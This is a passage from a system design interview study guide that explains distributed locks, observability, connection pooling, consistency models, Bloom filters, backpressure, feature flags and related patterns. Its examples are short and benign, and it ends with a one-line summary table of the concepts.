UPDATE accounts SET balance = 1100 WHERE id = 2;  -- was 1000
COMMIT;

WAL writes (in order):
1. [LSN 100] BEGIN transaction_id=42
2. [LSN 101] UPDATE accounts id=1 old=1000 new=900
3. [LSN 102] UPDATE accounts id=2 old=1000 new=1100
4. [LSN 103] COMMIT transaction_id=42

Power failure after LSN 103 but before data files updated:

On restart:
1. PostgreSQL reads WAL
2. Sees COMMIT at LSN 103 → knows this transaction completed
3. Replays the changes to data files
4. Database is consistent again

Replication:
Primary ships WAL entries 100-103 to replica
Replica replays them → identical data
```

---

### Q55. What is a distributed lock?

**Answer:**

When multiple distributed processes need to access a shared resource (a file, a database row, a config) and only one should access it at a time, you need a **distributed lock**. Unlike a regular mutex (which works within a single process), a distributed lock works across multiple machines.

**Challenges:**
- What if the lock holder crashes? (Need TTL/expiry to prevent deadlock.)
- What if the clock drifts between machines? (Consistency issue.)
- What if the lock expires while the holder is still working?

**Common implementation: Redis SETNX (SET if Not eXists)**

**Example:**

```javascript
// Redis-based distributed lock
async function acquireLock(resource, ttlMs = 30000) {
  const lockKey = `lock:${resource}`;
  const lockValue = crypto.randomUUID(); // Unique value to identify our lock
  
  // SET key value NX (only if not exists) PX ttlMs (expire in ms)
  const acquired = await redis.set(lockKey, lockValue, "NX", "PX", ttlMs);
  
  if (acquired === "OK") {
    return lockValue; // We own the lock
  }
  return null; // Lock already held by someone else
}

async function releaseLock(resource, lockValue) {
  const lockKey = `lock:${resource}`;
  const currentValue = await redis.get(lockKey);
  
  // Only release if WE own the lock (compare lockValue)
  // Use Lua script for atomic check-and-delete:
  const luaScript = `
    if redis.call("get", KEYS[1]) == ARGV[1] then
      return redis.call("del", KEYS[1])
    else
      return 0
    end
  `;
  await redis.eval(luaScript, 1, lockKey, lockValue);
}

// Usage:
async function processPayment(orderId) {
  const lock = await acquireLock(`payment:${orderId}`, 10000); // 10s timeout
  
  if (!lock) {
    throw new Error("Payment already being processed");
  }
  
  try {
    await chargeCustomer(orderId);
    await updateOrderStatus(orderId, "paid");
  } finally {
    await releaseLock(`payment:${orderId}`, lock);
  }
}
```

---

### Q56. What is observability in distributed systems?

**Answer:**

**Observability** is the ability to understand the internal state of a system by examining its external outputs. In distributed systems with many services, something is always failing somewhere. Observability is what lets you find and understand those failures.

The three pillars of observability:

**1. Logs** — Timestamped records of discrete events.
- Structured logging (JSON) is much better than plain text for querying.
- Tools: ELK Stack (Elasticsearch, Logstash, Kibana), Loki+Grafana.

**2. Metrics** — Numeric measurements over time (counters, gauges, histograms).
- Request rate, error rate, latency percentiles (p50, p99), CPU/memory usage.
- Tools: Prometheus + Grafana.

**3. Traces** — End-to-end records of a request flowing through multiple services.
- Each service adds a "span" with timing and metadata. All spans share a trace ID.
- Tools: Jaeger, Zipkin, AWS X-Ray, Datadog APM.

**Example:**

```javascript
// Structured logging (Winston)
logger.info("Order processed", {
  orderId: "123",
  userId: "42",
  amount: 59.99,
  durationMs: 145,
  traceId: "abc-def-ghi"  // For correlating with traces
});

// Metrics (Prometheus)
const httpRequestDuration = new Histogram({
  name: "http_request_duration_seconds",
  help: "Duration of HTTP requests",
  labelNames: ["method", "route", "status_code"],
  buckets: [0.01, 0.05, 0.1, 0.5, 1, 5]
});

// On each request:
const end = httpRequestDuration.startTimer();
// ... handle request ...
end({ method: "GET", route: "/api/orders", status_code: 200 });

// Distributed tracing (OpenTelemetry)
const tracer = opentelemetry.trace.getTracer("order-service");
const span = tracer.startSpan("processOrder");
span.setAttribute("order.id", orderId);
// ... call payment service, inventory service (they add their own spans) ...
span.end();
// In Jaeger UI: See full journey of the request across all services
```

---

### Q57. What is database connection pooling?

**Answer:**

Opening a new database connection is expensive — it involves TCP handshake, authentication, and session setup, taking 20-100ms. If every API request opens and closes its own connection, you'll waste enormous resources.

**Connection pooling** maintains a pool of pre-established database connections that are reused across requests.

**How it works:**
1. Application starts → pool opens N connections to the database.
2. Request arrives → get an idle connection from the pool.
3. Execute query.
4. Return connection to pool (not closed!).
5. Next request reuses the same connection.

**Key configuration:**
- `min` connections — Always kept open (warm).
- `max` connections — Pool won't open more than this.
- `idle timeout` — Close connections unused for X seconds.
- `connection timeout` — How long to wait if all connections are busy.

**Example:**

```javascript
// PostgreSQL connection pool (pg library)
const { Pool } = require("pg");

const pool = new Pool({
  host: "localhost",
  database: "myapp",
  user: "postgres",
  password: process.env.DB_PASSWORD,
  min: 5,          // Always keep 5 connections open
  max: 20,         // Never more than 20 simultaneous connections
  idleTimeoutMillis: 30000,     // Close idle connections after 30s
  connectionTimeoutMillis: 2000 // Error if no connection available in 2s
});

// Usage — automatically uses pool, no manual connection management:
app.get("/users/:id", async (req, res) => {
  const { rows } = await pool.query(
    "SELECT * FROM users WHERE id = $1",
    [req.params.id]
  );
  res.json(rows[0]);
});

// Without pool: 100 concurrent requests → 100 new connections → ~5 seconds each!
// With pool (max=20): 100 requests → first 20 run immediately, 
//   80 wait briefly → same 20 connections handle all 100 requests efficiently
```

---

### Q58. What is eventual consistency vs strong consistency?

**Answer:**

This is a core trade-off in distributed database design.

**Strong (Linearizable) Consistency:**
- After a write completes, any subsequent read from any node returns the new value.
- All nodes see the same data at the same time.
- Requires coordination (usually a leader/primary).
- Higher latency, lower availability during network issues.
- Example: Financial transactions, inventory systems.

**Eventual Consistency:**
- After a write, replicas will *eventually* reflect it (usually milliseconds to seconds).
- Between the write and full propagation, different nodes may return different values.
- Higher availability, lower latency.
- Example: Social media likes, view counts, DNS propagation.

**Example:**

```
Scenario: Online store inventory — 1 item left

STRONG CONSISTENCY (Single leader, synchronous replicas):
User A and User B both try to buy at the same time:
1. User A's request reaches primary → checks: stock=1 → reserves → stock=0 → commits
2. User B's request waits or is rejected: stock=0 → "Out of stock"
→ Only ONE item sold. Correct!

EVENTUAL CONSISTENCY (Multi-leader or leaderless):
1. User A's request goes to Replica A → checks: stock=1 → OK
2. User B's request goes to Replica B → checks: stock=1 → OK (replication not done yet!)
3. Both purchases go through
4. Replicas reconcile: stock=-1 (oversold!)
→ Two people bought the last item. Problem!

Solution: Use strong consistency for critical operations (inventory, payments).
Use eventual consistency for non-critical operations (view counts, analytics).
```

---

### Q59. What is a bloom filter and when would you use it?

**Answer:**

A **Bloom filter** is a space-efficient probabilistic data structure that tells you whether an element is **definitely not** in a set, or **possibly** in a set. It can have **false positives** (says "yes" when the answer is "no") but never **false negatives** (never says "no" when the answer is "yes").

**How it works:** Uses multiple hash functions and a bit array. To add an element, hash it with each function and set those bit positions to 1. To check, hash it and check if all those positions are 1. If any is 0, definitely not in set.

**Use cases:**
- **Username availability check** — Before querying the DB, check Bloom filter: "Is this username taken?" If filter says no → definitely available. If yes → query DB to confirm.
- **Cache negative lookups** — Avoid querying the DB for things that definitely don't exist.
- **Spam filter** — Quick check if an email domain is known-spam without querying a large DB.
- **Browser Safe Browsing** — Chrome uses Bloom filters to quickly check if URLs are in the malicious URL database.

**Example:**

```python
from bloom_filter import BloomFilter

# Create filter: expect 1 million items, allow 0.1% false positive rate
bf = BloomFilter(max_elements=1_000_000, error_rate=0.001)

# Add all existing usernames (during startup or from DB)
bf.add("alice")
bf.add("bob")
bf.add("charlie")

# Check availability before DB query:
def is_username_available(username):
    if username not in bf:
        # DEFINITELY not taken — no DB query needed!
        return True
    else:
        # Possibly taken, maybe false positive — confirm with DB
        return db.query("SELECT id FROM users WHERE username = $1", username) is None

# For 1M users:
# Without Bloom filter: every availability check = 1 DB query
# With Bloom filter: ~99.9% of "available" names → 0 DB queries!
# Only ~0.1% false positives trigger unnecessary DB queries.
```

---

### Q60. What is the difference between push and pull architectures in system design?

**Answer:**

**Push architecture:** The data source **proactively sends** data to consumers when new data is available.

**Pull architecture:** Consumers **request data** from the source when they need it (polling).

**Push pros/cons:**
- ✅ Real-time — consumers get data immediately.
- ✅ No wasted polling when there's nothing new.
- ❌ Source must track all consumers and their states.
- ❌ Consumers must always be available/connected.
- ❌ Consumer may be overwhelmed if source sends too fast.

**Pull pros/cons:**
- ✅ Consumer controls the pace (backpressure).
- ✅ Consumer can be offline, reconnect, and catch up.
- ❌ Latency if polling interval is long.
- ❌ Wasteful if polling frequently with no new data.

**Example:**

```
PUSH — Stock price alerts:
Stock ticker → WebSocket push to all subscribed clients
Client receives: { symbol: "AAPL", price: 185.20, time: "..." }
→ Real-time, no polling

PULL — Microservice pulling from Kafka:
Consumer group polls Kafka every 100ms:
  "Any new messages in order-placed topic?"
  "Yes, here are 50 messages"
  Consumer processes them, commits offset, polls again
→ Consumer controls pace, can handle backpressure

Hybrid — Email:
IMAP IDLE (push): Server pushes notification when new email arrives
Traditional polling (pull): Outlook checks every 5 minutes

Real-world example (monitoring):
Push (Prometheus Pushgateway): Short-lived jobs push their metrics before dying
Pull (Prometheus default): Prometheus scrapes (pulls) metrics from your service every 15s
```

---

### Q61. What are some key strategies for designing a highly available system?

**Answer:**

**High Availability (HA)** means the system continues working even when components fail. The target is usually expressed as "nines" — 99.9% uptime = 8.7 hours downtime/year. 99.99% = 52 minutes/year.

**Key strategies:**

1. **Eliminate Single Points of Failure (SPOF)** — If any single component can take down the system, add redundancy (multiple servers, replicas, power supplies, network paths).

2. **Replication** — Replicate databases, services, and data across multiple nodes and availability zones.

3. **Load Balancing** — Distribute traffic so no single server is overwhelmed and failed servers are bypassed.

4. **Health Checks and Auto-Recovery** — Automatically detect failures and restart/replace failed components.

5. **Graceful Degradation** — When a non-critical service fails, continue serving core functionality in a degraded mode.

6. **Circuit Breakers** — Prevent cascading failures.

7. **Multi-Region Deployment** — Survive entire data center failures by deploying across geographic regions.

8. **Chaos Engineering** — Deliberately break things in production to test resilience (Netflix's Chaos Monkey).

**Example:**

```
Highly available web application architecture:

Region: US East (Primary)
├── Load Balancer (2 instances, active-active)
│   ├── Web Server A (auto-scaling group, min 2 max 10)
│   ├── Web Server B
│   └── Web Server C
├── Cache Cluster (Redis Sentinel, 1 master + 2 replicas)
└── Database (PostgreSQL primary + 2 synchronous replicas)
         │
         │ Async replication
         ▼
Region: US West (Standby)
└── Database (PostgreSQL replica — promoted in case of US East failure)

Health checks: Load balancer pings /health every 5 seconds.
If server doesn't respond in 3 tries → removed from rotation.
Auto-scaling: If CPU > 70% for 5 minutes → launch more servers.
Database failover: If primary goes down, Patroni automatically promotes replica.

SLA: 99.99% uptime
Allowed downtime: ~52 minutes/year
Achieved by: No single server failure causes downtime.
Only full region failure matters, and that triggers cross-region failover.
```

---

### Q62. What is the strangler fig pattern for migrating from a monolith to microservices?

**Answer:**

The **Strangler Fig** pattern (named after a parasitic fig tree that gradually replaces its host) is an approach to incrementally migrate a monolithic application to microservices without a risky "big bang" rewrite.

**How it works:**
1. Stand up a new microservice alongside the monolith.
2. Route a specific feature's traffic to the new service via an API gateway or proxy.
3. The new service "strangles" the monolith one feature at a time.
4. Eventually, the monolith is completely replaced (or significantly reduced).

**Why not rewrite from scratch?** Full rewrites are extremely risky — months of work, feature parity is hard to achieve, bugs are introduced, and the business can't ship new features during the rewrite.

**Example:**

```
E-commerce monolith migration plan:

Phase 0: Monolith handles everything
[Monolith: Users, Products, Orders, Payments, Notifications]

Phase 1: Extract Notifications Service
Router:
  /api/notifications/* → New Notifications Microservice
  Everything else → Monolith

Phase 2: Extract User Service
Router:
  /api/users/* → New User Microservice
  /api/notifications/* → Notifications Microservice
  Everything else → Monolith

Phase 3: Extract Payment Service
Router:
  /api/payments/* → New Payment Microservice
  ...

Phase 6 (final): Monolith is gone or just handles edge cases
[User MS] [Product MS] [Order MS] [Payment MS] [Notification MS]

Benefits:
- Deploy and test each extraction separately
- Roll back individual services if issues arise
- Business keeps shipping features throughout migration
- Each new service is properly designed (not rushed)
```

---

### Q63. What is backpressure in distributed systems?

**Answer:**

**Backpressure** is a mechanism by which a downstream system signals upstream systems to slow down when it can't keep up with the rate of incoming data. Without backpressure, a slow consumer gets overwhelmed, leading to out-of-memory errors, dropped messages, or cascading failures.

**Real-world analogy:** A garden hose connected to a fire hydrant. Without backpressure, the hose bursts. With a pressure regulator (backpressure), the hydrant adjusts its output to what the hose can handle.

**Implementations:**
- **TCP flow control** — Built-in. TCP receiver advertises how much buffer space is available. Sender doesn't exceed it.
- **Message queue** — Queue fills up → producer blocks or slows down (configurable).
- **Reactive Streams (RxJS, Project Reactor)** — Consumer subscribes and requests N items at a time.

**Example:**

```
Scenario: Data pipeline processing IoT sensor readings

Without backpressure:
Sensors → [Kafka Topic] → Database Writer
- Sensors produce 100,000 msgs/sec
- Database writer can only handle 10,000 writes/sec
- Kafka queue fills up → runs out of disk → producer crashes

With backpressure (Kafka consumer):
// Consumer controls consumption rate
while (running) {
  // Only fetch 500 messages at a time
  const messages = await consumer.fetch({ maxMessages: 500 });
  
  // Process them (might take 500ms)
  await batchWriteToDatabase(messages);
  
  // Commit offset only after successful write
  await consumer.commitOffsets();
  
  // Fetch next 500 — naturally rate-limited to DB write speed
}

// Kafka retains unprocessed messages safely on disk
// Consumer processes at its own pace
// No message loss, no out-of-memory errors
// Lag metric alerts if consumer falls too far behind
```

---

### Q64. What is a feature flag and how is it used in system design?

**Answer:**

A **feature flag** (also called feature toggle or feature switch) is a technique that allows you to enable or disable features in your application at runtime without deploying new code.

**Use cases:**
1. **Gradual rollout** — Enable a new feature for 1% of users, then 10%, then 100%.
2. **A/B testing** — Show Feature A to half of users, Feature B to the other half.
3. **Kill switch** — Immediately disable a feature that's causing problems without a rollback deploy.
4. **Beta testing** — Enable a feature only for beta users or specific organizations.
5. **Trunk-based development** — Merge incomplete features behind a flag; code is in main but not visible.

**Example:**

```javascript
// Feature flag configuration (LaunchDarkly, Unleash, or simple Redis/DB)
const flags = {
  "new-checkout-flow": { enabled: true, rollout: 25 },  // 25% of users
  "ai-recommendations": { enabled: true, rollout: 100 }, // 100% = fully launched
  "beta-dashboard": { enabled: true, users: ["alice@ex.com", "beta@org.com"] }
};

// Usage in code:
async function renderCheckoutPage(userId) {
  const useNewCheckout = await featureFlags.isEnabled("new-checkout-flow", userId);
  
  if (useNewCheckout) {
    return renderNewCheckoutFlow();   // New implementation
  } else {
    return renderLegacyCheckoutFlow(); // Old implementation
  }
}

// Gradual rollout algorithm:
function isEnabledForUser(flag, userId) {
  // Deterministic hash so same user always gets same variant
  const userBucket = hash(userId) % 100;
  return userBucket < flag.rollout;
}

// Emergency kill switch:
// → In LaunchDarkly dashboard, set "new-checkout-flow" rollout to 0%
// → Instantly reverts to legacy checkout for all users
// → No deployment needed! Takes effect in seconds.
```

---

## Summary Reference

| Concept | One-Line Summary |
|---------|-----------------|
| DNS | Phone book: domain name → IP address |
| CDN | Serve files from servers near users |
| Load Balancer | Distribute traffic across multiple servers |
| Horizontal Scaling | Add more servers |
| Vertical Scaling | Make servers bigger |
| Sharding | Split database across multiple servers |
| Replication | Copy database to multiple servers |
| Caching | Store expensive results for fast reuse |
| Redis | Fast in-memory data store for caching & queuing |
| Message Queue | Async task handoff between services |
| Kafka | Distributed event streaming log |
| Docker | Package apps into portable containers |
| Kubernetes | Orchestrate and scale containers |
| JWT | Self-contained authentication token |
| OAuth 2.0 | Authorization delegation ("Login with Google") |
| REST | URL-based HTTP API design style |
| GraphQL | Query exactly the data you need |
| gRPC | High-performance binary service-to-service calls |
| CAP Theorem | Distributed systems: pick 2 of Consistency/Availability/Partition-tolerance |
| ACID | Database transaction guarantees |
| Circuit Breaker | Prevent cascading failures when a service is down |
| Saga Pattern | Distributed transactions across microservices |
| Bloom Filter | Probabilistic "definitely not in set" check |
| Feature Flags | Enable/disable features at runtime without deploying |
| WAL | Log changes before applying them (crash recovery) |
| Connection Pool | Reuse database connections for efficiency |
| Backpressure | Signal upstream to slow down when overwhelmed |
| Observability | Logs + Metrics + Traces = understanding what your system is doing |
| Consistent Hashing | Distribute data with minimal reshuffling when nodes change |
| Strangler Fig | Gradually replace monolith with microservices |

---

*This guide covers the foundational to advanced system design concepts every AI engineer should understand. Revisit sections as you encounter these topics in real projects. The best way to solidify this knowledge is to build systems that use these patterns — even simple side projects will make these concepts click.*
